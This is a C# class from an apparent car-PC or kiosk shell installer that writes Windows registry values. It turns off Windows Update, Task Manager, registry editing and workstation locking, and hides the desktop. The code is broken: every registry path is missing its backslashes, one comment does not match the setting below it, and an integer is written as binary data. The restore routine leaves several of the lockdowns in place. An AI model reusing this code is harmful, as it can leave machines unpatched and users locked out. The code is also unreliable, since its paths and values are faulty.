using Microsoft.Win32;
using System;

namespace CarShellInstaller.Core
{
    public class RegistryManager
    {
        public bool ApplyCarShellTweaks()
        {
            try
            {
                // Windows Update
                SetRegistryValue(Registry.LocalMachine, 
                    @"SOFTWAREMicrosoftWindowsCurrentVersionWindowsUpdateAuto Update",
                    "AUOptions", 1, RegistryValueKind.DWord);
                SetRegistryValue(Registry.LocalMachine,
                    @"SYSTEMCurrentControlSetServiceswuauserv",
                    "Start", 4, RegistryValueKind.DWord);
                
                // Performance optimizations
                SetRegistryValue(Registry.LocalMachine,
                    @"SYSTEMCurrentControlSetControlPriorityControl",
                    "Win32PrioritySeparation", 26, RegistryValueKind.DWord);
                
                // Disable visual effects
                SetRegistryValue(Registry.CurrentUser,
                    @"Control PanelDesktopWindowMetrics",
                    "MinAnimate", 0, RegistryValueKind.DWord);
                SetRegistryValue(Registry.CurrentUser,
                    @"Control PanelDesktop",
                    "UserPreferencesMask", 0x9012019E, RegistryValueKind.Binary);
                
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                return false;
            }
        }

        public bool ApplyKioskTweaks()
        {
            try
            {
                // Disable lock workstation
                SetRegistryValue(Registry.LocalMachine,
                    @"SOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem",
                    "DisableLockWorkstation", 1, RegistryValueKind.DWord);
                
                // Disable Task Manager
                SetRegistryValue(Registry.LocalMachine,
                    @"SOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem",
                    "DisableTaskMgr", 1, RegistryValueKind.DWord);
                
                // Disable Ctrl+Alt+Del
                SetRegistryValue(Registry.CurrentUser,
                    @"SOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem",
                    "DisableLockWorkstation", 1, RegistryValueKind.DWord);
                
                // Disable Registry Tools
                SetRegistryValue(Registry.CurrentUser,
                    @"SOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem",
                    "DisableRegistryTools", 1, RegistryValueKind.DWord);
                
                // Hide desktop icons
                SetRegistryValue(Registry.CurrentUser,
                    @"SoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer",
                    "NoDesktop", 1, RegistryValueKind.DWord);
                
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                return false;
            }
        }

        public bool RestoreDefaultRegistry()
        {
            try
            {
                // Restore Windows Update
                SetRegistryValue(Registry.LocalMachine,
                    @"SOFTWAREMicrosoftWindowsCurrentVersionWindowsUpdateAuto Update",
                    "AUOptions", 4, RegistryValueKind.DWord);
                SetRegistryValue(Registry.LocalMachine,
                    @"SYSTEMCurrentControlSetServiceswuauserv",
                    "Start", 3, RegistryValueKind.DWord);
                
                // Restore visual effects
                SetRegistryValue(Registry.CurrentUser,
                    @"Control PanelDesktopWindowMetrics",
                    "MinAnimate", 1, RegistryValueKind.DWord);
                
                // Restore access
                SetRegistryValue(Registry.LocalMachine,
                    @"SOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem",
                    "DisableTaskMgr", 0, RegistryValueKind.DWord);
                SetRegistryValue(Registry.LocalMachine,
                    @"SOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem",
                    "DisableLockWorkstation", 0, RegistryValueKind.DWord);
                
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                return false;
            }
        }

        private void SetRegistryValue(RegistryKey root, string path, string name, object value, RegistryValueKind kind)
        {
            using (var key = root.CreateSubKey(path, RegistryKeyPermissionCheck.ReadWriteSubTree))
            {
                if (key != null) key.SetValue(name, value, kind);
            }
        }
    }
}